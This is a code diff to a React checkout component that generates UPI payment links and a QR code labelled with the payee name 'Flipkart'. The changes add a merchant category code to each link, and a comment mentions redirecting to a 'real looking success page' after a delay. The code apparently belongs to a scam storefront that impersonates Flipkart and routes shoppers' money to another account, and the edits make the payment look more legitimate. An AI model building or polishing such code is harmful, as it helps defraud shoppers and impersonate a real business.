@@ -100,7 +100,7 @@ const Checkout = () => {
         : { guestAddress: selectedAddress, guestCartItems: cartItems, guestEmail: selectedAddress.email };
       
       const { data } = await api.post('/payment/create', payload);
-      setTransactionId(`TR_${data.order_id}_${Date.now()}`);
+      setTransactionId(`TR_${Date.now()}`);
       setStep(3);
     } catch (error) {
       console.error('Order creation failed:', error);
@@ -135,9 +135,9 @@ const Checkout = () => {
       
       // Attempt to open UPI app
       setTimeout(() => {
-        if (selectedPayment === 'phonepe') window.location.href = `phonepe://pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`;
-        else if (selectedPayment === 'gpay') window.location.href = `tez://upi/pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`;
-        else if (selectedPayment === 'paytm') window.location.href = `paytmmp://pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`;
+        if (selectedPayment === 'phonepe') window.location.href = `phonepe://pay?pa=${UPI_ID}&pn=Flipkart&mc=5499&tr=${transactionId}&am=${finalPayable}&cu=INR`;
+        else if (selectedPayment === 'gpay') window.location.href = `tez://upi/pay?pa=${UPI_ID}&pn=Flipkart&mc=5499&tr=${transactionId}&am=${finalPayable}&cu=INR`;
+        else if (selectedPayment === 'paytm') window.location.href = `paytmmp://pay?pa=${UPI_ID}&pn=Flipkart&mc=5499&tr=${transactionId}&am=${finalPayable}&cu=INR`;
       }, 500);
 
       // Wait 2 minutes in background, then redirect to real looking success page
@@ -176,7 +176,7 @@ const Checkout = () => {
         <div className="flex-1 overflow-y-auto px-6 py-6 flex flex-col items-center">
           <h2 className="text-2xl font-bold mb-6 text-black">Scan QR Code to Pay</h2>
           <div className="mb-8 p-1">
-            <QRCodeSVG value={`upi://pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`} size={220} />
+            <QRCodeSVG value={`upi://pay?pa=${UPI_ID}&pn=Flipkart&mc=5499&tr=${transactionId}&am=${finalPayable}&cu=INR`} size={220} />
           </div>
           <div className="text-xl font-bold text-black mb-6">
             Order Amount ₹{finalPayable}
